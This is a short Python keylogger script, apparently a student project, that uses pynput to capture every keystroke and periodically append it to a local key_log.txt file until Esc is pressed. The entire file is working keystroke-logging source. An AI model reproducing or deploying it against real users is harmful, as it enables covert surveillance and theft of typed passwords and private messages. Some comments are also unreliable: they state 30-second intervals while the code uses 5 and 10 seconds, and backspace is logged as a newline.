from pynput.keyboard import Key, Listener
import time
import threading

# Global variables
keys_information = "key_log.txt"
file_path = "/Users/sameerjain/Desktop/project 3rd year/keylogger/python-project"
extend = "/"
temporary_keys = []
lock = threading.Lock()

def write_to_file(keys):
    global temporary_keys
    with lock:
        temporary_keys.extend(keys)

def send_to_final_file():
    global temporary_keys
    with lock:
        with open(file_path + extend + keys_information, "a") as f:
            for key in temporary_keys:
                k = str(key).replace("'", "")
                if k.find("Key.space") != -1:
                    f.write(" ")
                elif k.find("Key.enter") !=-1:
                    f.write("\n")
                elif k.find("Key.backspace") !=-1:
                    f.write("\n")
                else:
                    f.write(k)
            f.write("\n")
        temporary_keys.clear()  # Clear the temporary list after writing to final file

def record_and_send():
    # Record keys for 30 seconds
    time.sleep(5)
    send_to_final_file()
    # Schedule the function to run again after 30 seconds
    threading.Timer(10, record_and_send).start()

def on_press(key):
    write_to_file([key])

def on_release(key):
    if key == Key.esc:
        send_to_final_file()  # Send remaining keys to final file before exiting
        exit()

# Start the initial recording and sending process
record_and_send()

# Start listening for key presses
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
